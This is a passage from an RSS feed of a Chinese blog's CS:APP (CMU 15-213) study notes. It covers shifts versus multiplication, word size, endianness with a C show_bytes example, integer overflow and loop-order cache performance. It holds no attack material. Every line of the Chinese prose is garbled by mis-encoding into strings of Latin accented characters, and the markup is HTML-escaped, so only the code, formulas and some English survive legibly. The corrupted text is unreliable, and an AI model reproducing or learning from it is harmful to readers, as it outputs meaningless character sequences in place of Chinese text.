é€šå¸¸,è®¡ç®—æœºç§»ä½æ¯”ä¹˜æ³•å¿«å¾—å¤š,ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ¯”è¾ƒé€‰æ‹©æœ€å¿«çš„æ–¹å¼:
$$u\ll 5 - u \ll 3 == u * 24 $$
ç›¸ä¼¼åœ°,
å¯¹äºunsignedç±»å‹:
$$ u\gg k == \left\lfloor  \frac{u}{2^k}  \right\rfloor $$
å¯¹äºsignedç±»å‹ä½¿ç”¨&lt;strong&gt;ç®—æœ¯ç§»ä½&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;åœ¨å†…å­˜,æŒ‡é’ˆ,å­—ç¬¦ä¸²ä¸­çš„è¡¨ç¤º&lt;/h1&gt;
&lt;h2&gt;é¢å‘å­—èŠ‚çš„å†…å­˜ç»„ç»‡&lt;/h2&gt;
&lt;p&gt;ç¨‹åºé€šè¿‡åœ°å€è®¿é—®æ•°æ®,åœ°å€å°±åƒæ•°ç»„çš„ç´¢å¼•
ç³»ç»Ÿç»™æ¯ä¸ªç¨‹åºæä¾›ç§æœ‰åœ°å€ç©ºé—´&lt;/p&gt;
&lt;h2&gt;å­—é•¿&lt;/h2&gt;
&lt;p&gt;å­—é•¿æ˜¯è®¡ç®—æœºæƒ¯å¸¸å¤„ç†çš„æ•°å€¼å¤§å°ä»¥åŠåœ°å€çš„å¤§å°
æ‰€ä»¥,32ä½è®¡ç®—æœºçš„åœ°å€å±€é™æ˜¯4GB(2^ 32 bytes)
64ä½è®¡ç®—æœºå¯ä»¥æœ‰18EBçš„åœ°å€å†…å­˜
ç¡¬ä»¶å’Œç¼–è¯‘å™¨å…±åŒå†³å®šåœ¨æŸä¸ªç¨‹åºä¸­ä½¿ç”¨å¤šå¤§çš„å­—é•¿,è¿™æä¾›äº†ä¸€äº›å…¼å®¹æ€§&lt;/p&gt;
&lt;h2&gt;å¤§ç«¯åºå’Œå°ç«¯åº&lt;/h2&gt;
&lt;p&gt;æŒ‰ç…§å¤šå­—èŠ‚æ•°æ®åœ¨å­˜å‚¨å™¨ä¸­çš„å­˜å‚¨é¡ºåºåˆ†ä¸ºå¤§ç«¯åºå’Œå°ç«¯åº
å¤§ç«¯åºè®¾å¤‡:æŸäº›äº’è”ç½‘è®¾æ–½
å°ç«¯åºè®¾å¤‡:x86,ARMå¤„ç†å™¨
å¤§ç«¯åº:ä½ä½å­˜å‚¨åœ¨é«˜åœ°å€
å°ç«¯åº:ä½ä½å­˜å‚¨åœ¨ä½åœ°å€
![](attachments/Pasted image%2020250114231324.png%20)
æ£€æŸ¥æ•°æ®åœ¨å†…å­˜ä¸­çš„å­˜å‚¨é¡ºåº:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;typedef unsigned char *pointer; 
void show_bytes(pointer start, size_t len){ 
	size_t i; 
	for (i = 0; i &amp;lt; len; i++) 
		printf(â€%p\t0x%.2x\n&amp;quot;,start+i, start[i]);  // %p:æ‰“å°æŒ‡é’ˆ,%x:æ‰“å°åå…­è¿›åˆ¶æ•°
	printf(&amp;quot;\n&amp;quot;); 
}

			   
int a = 15213; 
printf(&amp;quot;int a = 15213;\n&amp;quot;); 
show_bytes((pointer) &amp;amp;a, sizeof(int));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æœ(Linux x86-64):&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;int a = 15213; 
0x7fffb7f71dbc 6d 
0x7fffb7f71dbd 3b 
0x7fffb7f71dbe 00 
0x7fffb7f71dbf 00
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Mon, 13 Jan 2025 00:00:00 GMT</pubDate></item><item><title>CS:APPè¯¾ç¨‹æ¦‚è§ˆ</title><link>https://www.tankimzeg.top/blog/%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%A7%88-course-overview/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%A7%88-course-overview/</guid><description>ç¬¬ä¸€èŠ‚è¯¾ä¸€èˆ¬éƒ½æ˜¯å¹å¹æ°´ğŸ¥±</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%A7%88-course-overview/&quot;&gt;https://www.tankimzeg.top/blog/%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%A7%88-course-overview/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;è¯¾ä»¶:&lt;a href=&quot;https://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/schedule.html&quot;&gt;15-213: Introduction to Computer Systems / Schedule Fall 2015&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è§†é¢‘:&lt;a href=&quot;https://www.bilibili.com/video/BV1iW411d7hd&quot;&gt;2015 CMU 15-213 CSAPP æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ è¯¾ç¨‹è§†é¢‘&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å®éªŒ:&lt;a href=&quot;https://csapp.cs.cmu.edu/3e/labs.html&quot;&gt;CS:APP3e, Bryant and O&amp;#39;Hallaron&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;2015 CMU 15-213: Introduction to Computer Systems&lt;/h1&gt;
&lt;p&gt;Instructors: Randal E. Bryant and David R.O&amp;#39;Hallaron&lt;/p&gt;
&lt;p&gt;(æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ CSAPPä½œè€…)&lt;/p&gt;
&lt;h2&gt;è¯¾ç¨‹ä¸»é¢˜ï¼š&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;å¤§å¤šæ•° CS å’Œ CE è¯¾ç¨‹éƒ½å¼ºè°ƒæŠ½è±¡&lt;ul&gt;
&lt;li&gt;æŠ½è±¡æ•°æ®ç±»å‹&lt;/li&gt;
&lt;li&gt;éå…¸å‹åˆ†æ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;è¿™äº›æŠ½è±¡æœ‰å…¶å±€é™æ€§&lt;ul&gt;
&lt;li&gt;ç‰¹åˆ«æ˜¯åœ¨å­˜åœ¨é”™è¯¯çš„æƒ…å†µä¸‹&lt;/li&gt;
&lt;li&gt;éœ€è¦äº†è§£åº•å±‚å®ç°çš„ç»†èŠ‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å­¦ä¹ æœ¬è¯¾ç¨‹çš„æœ‰ç›Šæˆæœ&lt;ul&gt;
&lt;li&gt;æˆä¸ºæ›´æœ‰æ•ˆç‡çš„ç¨‹åºå‘˜&lt;ul&gt;
&lt;li&gt;èƒ½å¤Ÿæœ‰æ•ˆåœ°å‘ç°å’Œæ¶ˆé™¤bug&lt;/li&gt;
&lt;li&gt;èƒ½å¤Ÿç†è§£å¹¶è°ƒæ•´ç¨‹åºæ€§èƒ½&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ä¸ºä»¥åå­¦ä¹  CS å’Œ ECE çš„ &amp;quot;ç³»ç»Ÿ &amp;quot;è¯¾ç¨‹åšå‡†å¤‡&lt;ul&gt;
&lt;li&gt;ç¼–è¯‘å™¨ã€æ“ä½œç³»ç»Ÿã€ç½‘ç»œã€è®¡ç®—æœºä½“ç³»ç»“æ„ã€&lt;/li&gt;
&lt;li&gt;åµŒå…¥å¼ç³»ç»Ÿã€å­˜å‚¨ç³»ç»Ÿç­‰&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;1:int ä¸æ˜¯æ•´æ•°,float ä¸æ˜¯å®æ•°&lt;/h2&gt;
&lt;p&gt;$$ x^2\ge0 $$
ä½†æ˜¯è®¡ç®—æœºä¸­å­˜åœ¨æ•°å€¼æº¢å‡ºçš„é—®é¢˜ï¼Œä¸æ€»æ˜¯æˆ‘ä»¬æœŸæœ›çš„è¡Œä¸º
&lt;code&gt;print 50000*50000&lt;/code&gt;
è¾“å‡º-1794967296
è€Œ&lt;code&gt;print 1e20+(-1e20+3.14)&lt;/code&gt;
è¾“å‡º0
&lt;code&gt;print 1e20+-1e20+3.14&lt;/code&gt;
è¾“å‡º3.1400000000000001&lt;/p&gt;
&lt;h2&gt;è®¡ç®—æœºç®—æœ¯&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ä¸ä¼šäº§ç”Ÿéšæœºæ•°&lt;/li&gt;
&lt;li&gt;ä¸èƒ½æƒ³å½“ç„¶è®¤ä¸ºå®ƒéµå®ˆä¸€èˆ¬çš„æ•°å­¦æ€§è´¨&lt;/li&gt;
&lt;li&gt;éœ€è¦ç†è§£å“ªäº›æƒ…å¢ƒä¸‹ä½¿ç”¨å“ªäº›æŠ½è±¡&lt;/li&gt;
&lt;li&gt;å¯¹ç¼–è¯‘å™¨å’Œä¸¥è°¨çš„åº”ç”¨ç¨‹åºå‘˜çš„é‡è¦è¯é¢˜&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;2:äº†è§£æ±‡ç¼–&lt;/h2&gt;
&lt;h2&gt;3:å†…å­˜å¾ˆé‡è¦&lt;/h2&gt;
&lt;p&gt;éšæœºå­˜å–å­˜å‚¨å™¨æ˜¯ä¸€ç§éç‰©ç†æŠ½è±¡æ¦‚å¿µ&lt;/p&gt;
&lt;h2&gt;4:æå‡æ€§èƒ½&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void copyij(int src[2048][2048], int dst[2048][2048]) 
{ 
	int i,j; 
	for (i = 0; i &amp;lt; 2048; i++) 
		for (j = 0; j &amp;lt; 2048; j++) 
			dst[i][j] = src[i][j]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;4.3ms&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void copyij(int src[2048][2048], int dst[2048][2048]) 
{ 
	int i,j; 
	for (j = 0; j &amp;lt; 2048; j++) 
		for (i = 0; i &amp;lt; 2048; i++) 
			dst[i][j] = src[i][j]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;81.8ms
è¿™ä¸ªåˆ†å±‚å­˜å–çš„ä¾‹å­è¯´æ˜,æ€§èƒ½å–å†³äºè®¿é—®çš„æ–¹å¼&lt;/p&gt;
&lt;p&gt;ä¸ºä»€ä¹ˆæ€§èƒ½æœ‰å·®å¼‚?
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250113113958.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ¬ä¹¦å°é¢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;5:è®¡ç®—æœºä¸ä»…æ‰§è¡Œç¨‹åº&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;I/Oç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;ç½‘ç»œæœåŠ¡&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Mon, 13 Jan 2025 00:00:00 GMT</pubDate></item></channel></rss>